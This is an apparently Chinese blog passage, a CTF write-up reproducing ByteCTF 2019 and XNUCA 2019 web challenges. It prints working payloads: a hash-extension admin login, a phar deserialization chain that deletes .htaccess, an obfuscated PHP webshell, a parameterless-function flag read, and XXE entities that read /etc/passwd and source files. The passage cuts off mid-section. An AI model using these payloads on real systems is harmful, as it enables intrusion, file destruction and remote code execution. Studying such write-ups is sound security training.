class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">90</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>Lethe</span><br></pre></td></tr></table></figure>
<p>所以添加Cookie：<code>user=ec1b7c99078d6f2be7c25481b53bad40</code></p>
<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909135910582.png" alt="在这里插入图片描述"><br><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">用户名：admin</span><br><span class="line">密码（将\<span class="keyword">x</span>替换为%）：admin<span class="symbol">%80</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%90</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span>Lethe</span><br></pre></td></tr></table></figure></p>
<p>成功登陆，并可以上传文件。</p>
<p>3、审计代码，看到那些类以及魔术方法，总是感觉像反序列化的题目，但是并没有地方使用了<code>unserialize()</code>。看到了config.php中的FIle类使用了<code>mime_content_type()</code>，想到了之前看的SUCTF2019出题笔记（<a href="https://xz.aliyun.com/t/6057），如下：" target="_blank" rel="noopener">https://xz.aliyun.com/t/6057），如下：</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_detail</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i'</span>, <span class="keyword">$this</span>-&gt;filepath))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"nonono~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $mine = mime_content_type(<span class="keyword">$this</span>-&gt;filepath);</span><br><span class="line">    $store_path = <span class="keyword">$this</span>-&gt;open(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;filepath);</span><br><span class="line">    $res[<span class="string">'mine'</span>] = $mine;</span><br><span class="line">    $res[<span class="string">'store_path'</span>] = $store_path;</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909140947693.png" alt="在这里插入图片描述"></p>
<p>再配合上文件上传功能，所以这题整体的思路应该是利用 <strong>phar 反序列化</strong>：</p>
<ul>
<li><p>想办法将文件上传到其他目录中（这里因为tmp_name未知，所以无法利用）</p>
</li>
<li><p>重写 / 删除目录下的<code>.htaccess</code>文件。</p>
</li>
</ul>
<p>4、下面就是构造利用链来想办法删除或重写<code>.htaccess</code>文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//view.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> (<span class="string">"config.php"</span>);</span><br><span class="line">$file_name = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">$file_path = $_GET[<span class="string">'filepath'</span>];</span><br><span class="line">$file_name=urldecode($file_name);</span><br><span class="line">$file_path=urldecode($file_path);</span><br><span class="line">$file = <span class="keyword">new</span> File($file_name, $file_path);</span><br><span class="line">$res = $file-&gt;view_detail();</span><br><span class="line">$mine = $res[<span class="string">'mine'</span>];</span><br><span class="line">$store_path = $res[<span class="string">'store_path'</span>];</span><br></pre></td></tr></table></figure>
<p>可以看到在view.php页面，会用传入的<code>$file_name</code>和<code>$file_path</code>参数实例化<code>File</code>类，然后调用<code>view_detail()</code>方法，跟进File类：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $filepath)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filepath = $filepath;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_detail</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i'</span>, <span class="keyword">$this</span>-&gt;filepath))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"nonono~"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $mine = mime_content_type(<span class="keyword">$this</span>-&gt;filepath);  <span class="comment">//unserialize</span></span><br><span class="line">        $store_path = <span class="keyword">$this</span>-&gt;open(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;filepath);</span><br><span class="line">        $res[<span class="string">'mine'</span>] = $mine;</span><br><span class="line">        $res[<span class="string">'store_path'</span>] = $store_path;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename, $filepath)</span></span>&#123;</span><br><span class="line">        $res = <span class="string">"$filename is in $filepath"</span>;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;checker))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;upload_file();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关注<code>__destruct()</code>方法，可以看到用<code>$checker</code>调用了此类中不存的<code>upload_file()</code>函数，于是想到了<code>__call()</code>方法，继续寻找，发现<code>Profile</code>类中存在可利用的<code>__call()</code>方法，如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $_SESSION[<span class="string">'password'</span>];</span><br><span class="line">        $secret = <span class="string">"********"</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">"admin"</span> &amp;&amp; <span class="keyword">$this</span>-&gt;password != <span class="string">"admin"</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> ($_COOKIE[<span class="string">'user'</span>] === md5($secret.<span class="keyword">$this</span>-&gt;username.<span class="keyword">$this</span>-&gt;password))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin-&gt;open(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>__call()</code>方法中用<code>$admin</code>调用了<code>open()</code>函数，题目中的<code>open</code>函数如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename, $filepath)</span></span>&#123;</span><br><span class="line">    $res = <span class="string">"$filename is in $filepath"</span>;</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>思路到这里貌似卡住了，这个open函数没什么可利用的…</p>
<p>但是这里<code>$admin</code>我们是可控的，于是可以找一下php里面有没有可以用来删除/重写文件的类，正好存在可利用的同名<code>open()方法</code>，这样我们就可以将<code>$admin</code>实例化为此类的对象。</p>
<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909145138811.png" alt="在这里插入图片描述"></p>
<p>搜索结果的第一个<code>ZipArchive</code>类就可以利用（<a href="https://www.php.net/manual/en/ziparchive.open.php）" target="_blank" rel="noopener">https://www.php.net/manual/en/ziparchive.open.php）</a></p>
<p>该类的open方法，使用如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ZipArchive :: open （ string $filename [， int $flags ]）： mixed</span><br></pre></td></tr></table></figure>
<p>第一个参数为文件名，第二个参数可以设置使用的模式。（<a href="https://www.php.net/manual/en/zip.constants.php#ziparchive.constants.overwrite）" target="_blank" rel="noopener">https://www.php.net/manual/en/zip.constants.php#ziparchive.constants.overwrite）</a></p>
<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909145636472.png" alt="在这里插入图片描述"></p>
<p>使用上述两个模式并将文件名设为<code>.htaccess</code>的路径，即可删除该文件。</p>
<p>5、知道整个构造思路了之后，先得到<code>.htaccess</code>文件的路径，并上传一个shell.php如下（使用php可变函数拼接字符绕过过滤），<strong>上传后记下文件路径</strong>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//shell.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"syste"</span>;</span><br><span class="line">$b=<span class="string">"m"</span>;</span><br><span class="line">$c=$a.$b;</span><br><span class="line">$d=$c($_REQUEST[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>构造phar文件的脚本如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $filepath)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filepath = $filepath;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username =  <span class="string">"/var/www/html/sandbox/2ad1c8a81d5d1d24dcac4f7a110a605a/.htaccess"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = ZipArchive::OVERWRITE | ZipArchive::CREATE;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> File(<span class="string">'Lethe'</span>,<span class="string">'Lethe'</span>);</span><br><span class="line"><span class="comment">//echo unserialize($a);</span></span><br><span class="line">@unlink(<span class="string">"1.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"1.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$phar-&gt;setMetadata($a); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行得到1.phar文件，上传后得到路径<code>sandbox/2ad1c8a81d5d1d24dcac4f7a110a605a/eec2d95bc618625503306c10fad5d37d.phar</code>。</p>
<p>然后去view.php触发反序列化，根据SUCTF2019的题目，可以用<code>php://filter/resource=phar://...</code>绕过对协议的过滤，最终访问</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">view.php?filename=eec<span class="number">2</span>d<span class="number">95</span>bc<span class="number">618625503306</span><span class="keyword">c</span><span class="number">10</span>fad<span class="number">5</span>d<span class="number">37</span>d.phar&amp;filepath=php://<span class="keyword">filter</span>/resource=phar://sandbox/<span class="number">2</span>ad<span class="number">1</span><span class="keyword">c</span><span class="number">8</span>a<span class="number">81</span>d<span class="number">5</span>d<span class="number">1</span>d<span class="number">24</span>dcac<span class="number">4</span>f<span class="number">7</span>a<span class="number">110</span>a<span class="number">605</span>a/eec<span class="number">2</span>d<span class="number">95</span>bc<span class="number">618625503306</span><span class="keyword">c</span><span class="number">10</span>fad<span class="number">5</span>d<span class="number">37</span>d.phar</span><br></pre></td></tr></table></figure>
<p>即可触发phar反序列化并删除<code>.htaccess</code>文件。</p>
<p>注意删除后不能再次访问<code>upload.php</code>，否则会再生成.htaccess，直接访问刚才上传shell返回的路径即可RCE。</p>
<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909155849502.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="ByteCTF-2019-BoringCode"><a href="#ByteCTF-2019-BoringCode" class="headerlink" title="ByteCTF_2019 BoringCode"></a>ByteCTF_2019 BoringCode</h1><p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="Bypass-One"><a href="#Bypass-One" class="headerlink" title="Bypass One"></a>Bypass One</h5><ul>
<li><p>用<code>is_valid_url()</code>来检测url格式。</p>
</li>
<li><p><code>url</code>的host必须以<code>baidu.com</code>结尾。</p>
</li>
<li><p>过滤了<code>data://</code>协议</p>
</li>
</ul>
<p>这题如果没有过滤掉data协议，可以用<code>data://text/plain;base64</code>来绕过，参考：<a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">https://www.jianshu.com/p/80ce73919edb</a></p>
<p>但是过滤掉了，那么许多师傅的解决办法就是直接买一个符合要求的域名。（好像还可以利用post.baidu.com生成跳转链接，感兴趣的可以自行搜索）</p>
<h5 id="Bypass-Two"><a href="#Bypass-Two" class="headerlink" title="Bypass Two"></a>Bypass Two</h5><p>自己搭一个第二层的本地环境来测试：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="string">|-- code</span></span><br><span class="line"><span class="string">||--- index.php</span></span><br><span class="line"><span class="string">|- flag.php</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">'code'</span>])&#123;</span><br><span class="line">    $code = $_POST[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>($code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hacker!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>正则限制了我们只能传入函数的形式，且最后一个括号内不能带有参数，即只允许形如<code>a(b(c()))</code>的字符串。</p>
<p>关于php无参数函数可参考：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">PHP Parametric Function RCE</a></p>
<p>根据文章，我们首先可以构造一个读取当前目录中最后一个文件的payload：</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">readfile(<span class="name">end</span>(<span class="name">scandir</span>('.')))<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>scandir()</code> ：列出目录中的文件和目录。</p>
</li>
<li><p><code>end()</code> ：将内部指针指向数组中的最后一个元素，并输出。</p>
</li>
<li><p><code>readfile()</code>：输出一个文件。</p>
</li>
</ul>
<p>但是问题是我们并不能在最后一个函数中使用参数<code>.</code>，所以就得找到一个函数可以不用参数就返回<code>.</code></p>
<p>存在函数<code>localeconv()</code> ，函数返回一包含本地数字及货币格式信息的数组。</p>
<p>其返回值如下：<br><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190916152254728.png" alt="在这里插入图片描述"><br>可以看到第一个正好是我们需要的<code>.</code>，下面就需要将它取出来。</p>
<p>又存在如下限制：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)</span><br></pre></td></tr></table></figure>
<p><code>nt</code>被过滤了，所以<code>current()</code>不能使用，但是存在一个别名<code>pos()</code>，所以可以用<code>pos(localeconv())</code>来生成<code>.</code>.</p>
<p>这样使用<code>readfile(end(scandir(pos(localeconv()))));</code>就可以读取的当前目录下的最后一个文件，但是flag在上一层的目录，因此我们还需要进行目录跳转。</p>
<ul>
<li><code>chdir()</code>：函数改变当前的目录。</li>
<li><code>next()</code>：将数组中的内部指针向前移动一位，返回数组内部指针指向的下一个单元的值，即scandir返回的<code>..</code></li>
</ul>
<p>这样可以构造：<code>chdir(next(scandir(pos(localeconv()))))</code>即可以将目录改变到上层目录。</p>
<p>但是这样子有个问题，就是<code>chdir()</code>只返回bool值，但是我们需要<code>.</code>才能读文件。</p>
<p>需要找一个函数接受bool值且返回值中可以输出<code>.</code>，根据altman学长的思路orz…<br>可以利用<code>chr()</code>配合上<code>localtime()</code>返回值中的秒数，当秒数为46时，转换为字符即为<code>.</code>（其ascii码为46）。</p>
<ul>
<li><p><code>chr()</code>：根据ascii码返回指定的字符。</p>
</li>
<li><p><code>localtime()</code>：取得本地时间，返回一个关联数组包含具体的时间信息。</p>
</li>
</ul>
<p>这里还有一个问题就是<code>localtime()</code>不接收bool值的参数，但是接受<code>time()</code>作为参数，而<code>time()</code>不会受参数的影响并且会返回一个时间戳。</p>
<p>这样我们最后的payload为（针对我的本地环境，非原题环境）：</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">echo(<span class="name">readfile</span>(<span class="name">end</span>(<span class="name">scandir</span>(<span class="name">chr</span>(<span class="name">pos</span>(<span class="name">localtime</span>(<span class="name">time</span>(<span class="name">chdir</span>(<span class="name">next</span>(<span class="name">scandir</span>(<span class="name">pos</span>(<span class="name">localeconv</span>()))))))))))))<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>重复发包，当秒数为46时，即可读到flag。</p>
<p><br></p>
<h1 id="rss"><a href="#rss" class="headerlink" title="rss"></a>rss</h1><p>1、进入页面后是一个订阅RSS的功能，限制了域名：</p>
<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909170200995.png" alt="在这里插入图片描述"></p>
<p>2、实际上RSS 是使用 XML 编写，那么就可能存在XXE漏洞。</p>
<p>参考：<a href="https://mikeknoop.com/lxml-xxe-exploit/" target="_blank" rel="noopener">https://mikeknoop.com/lxml-xxe-exploit/</a></p>
<p>上面文章中给了一个带有恶意ENTITY标记的RSS有效负载如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">"2.0"</span> <span class="attr">xmlns:atom</span>=<span class="string">"http://www.w3.org/2005/Atom"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>The Blog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://example.com/<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>A blog about things<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastBuildDate</span>&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span class="tag">&lt;/<span class="name">lastBuildDate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://example.com<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>a post<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">author</span>&gt;</span>author@example.com<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>3、下面就是如何将这个payload传进去，这里可以利用<code>data://</code>伪协议，用<code>data://text/plain;base64,</code> 来传入数据。</p>
<p>参考：<a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">https://www.jianshu.com/p/80ce73919edb</a></p>
<p>因为php是不关心MIME类型的，所以我们可以构造MIME类型来绕过对域名的过滤。</p>
<p>将上述xml进行base64编码：</p>
<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909171158259.png" alt="在这里插入图片描述"></p>
<p>所以传入：</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">data:</span><span class="comment">//baidu.com/plain;base64,</span></span><br></pre></td></tr></table></figure>
<p>可以看到：</p>
<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909171403182.png" alt="在这里插入图片描述"></p>
<p>4、因为不知道路径，我们先读一下源码，用下面的ENTITY替换一下上面payload中的（因为是php文件，所以要base64一下才能读出来）：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">xxe</span> <span class="attr">SYSTEM</span> "<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resource</span>=<span class="string">index.php</span>" &gt;</span>]&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190909172410971.png" alt="在这里插入图片描述"></p>
<p>base解码后得到：</p>
